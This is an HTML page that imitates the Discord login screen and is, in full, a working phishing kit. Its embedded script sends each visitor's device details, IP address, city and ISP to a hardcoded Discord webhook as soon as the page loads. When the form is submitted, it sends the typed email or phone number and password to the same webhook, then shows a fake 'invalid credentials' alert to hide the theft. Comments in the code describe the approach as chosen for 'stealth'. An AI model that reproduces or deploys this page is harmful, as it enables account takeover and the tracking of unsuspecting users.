<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
    body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo svg { width: 130px; height: auto; }
    h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 4px; }
    .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }
    .input-group { margin-bottom: 16px; }
    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; }
    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: 0.2s; }
    input:focus { border-color: #5865f2; }
    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.2s; }
    .btn:hover { background: #4752c4; }
    .footer { margin-top: 12px; color: #b5bac1; font-size: 14px; text-align: center; }
    .footer a { color: #00a8fc; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
  </div>
  <h2>Welcome back!</h2>
  <p class="sub">We're so excited to see you again!</p>
  <form id="loginForm">
    <div class="input-group">
      <label for="email">EMAIL OR PHONE NUMBER</label>
      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
    </div>
    <div class="input-group">
      <label for="password">PASSWORD</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>
    </div>
    <button type="submit" class="btn">Log In</button>
  </form>
  <div class="footer">
    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot password?</a>
  </div>
</div>
<script>
  (function() {
    // Webhook URL
    const WEBHOOK = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";

    // Collect all possible data
    function getVisitorData() {
      const data = {};

      // IP and country via free API (asynchronous)
      // We'll fetch this separately and store in session

      // Browser info
      data.userAgent = navigator.userAgent;
      data.language = navigator.language;
      data.platform = navigator.platform;
      data.screenWidth = screen.width;
      data.screenHeight = screen.height;
      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      data.referrer = document.referrer || "direct";
      data.url = window.location.href;

      // Try to get IP/country asynchronously
      return data;
    }

    // Function to send data to webhook
    function sendToWebhook(payload) {
      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(err => console.error('Webhook error:', err));
    }

    // Initial visitor data (without IP/country)
    const baseData = getVisitorData();

    // Fetch IP and country from free API
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(ipData => {
        baseData.ip = ipData.ip || 'unknown';
        baseData.country = ipData.country_name || ipData.country || 'unknown';
        baseData.city = ipData.city || 'unknown';
        baseData.region = ipData.region || 'unknown';
        baseData.isp = ipData.org || 'unknown';
        // Send initial visitor info once we have IP
        sendToWebhook({
          content: `**🆕 New Visitor**\nIP: ${baseData.ip}\nCountry: ${baseData.country}\nCity: ${baseData.city}\nRegion: ${baseData.region}\nISP: ${baseData.isp}\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`
        });
      })
      .catch(() => {
        // Fallback: send without IP
        sendToWebhook({
          content: `**🆕 New Visitor (IP fetch failed)**\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`
        });
      });

    // Capture form submission
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) return;

      // Build webhook message with credentials and all data
      let message = `**🔐 Login Credentials**\n`;
      message += `Email/Phone: ${email}\nPassword: ${password}\n`;
      message += `\n**Device Info**\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`;
      if (baseData.ip) {
        message += `\nIP: ${baseData.ip}\nCountry: ${baseData.country}\nCity: ${baseData.city}\nRegion: ${baseData.region}\nISP: ${baseData.isp}`;
      }

      sendToWebhook({ content: message });

      // Optionally show a fake "incorrect password" or redirect to real Discord
      alert('Invalid credentials. Please try again.');
      // Or redirect to real Discord login page
      // window.location.href = 'https://discord.com/login';
    });

    // Also capture keystrokes or input changes if you want real-time
    // but we just capture on submit for simplicity and stealth.
  })();
</script>
</body>
</html>
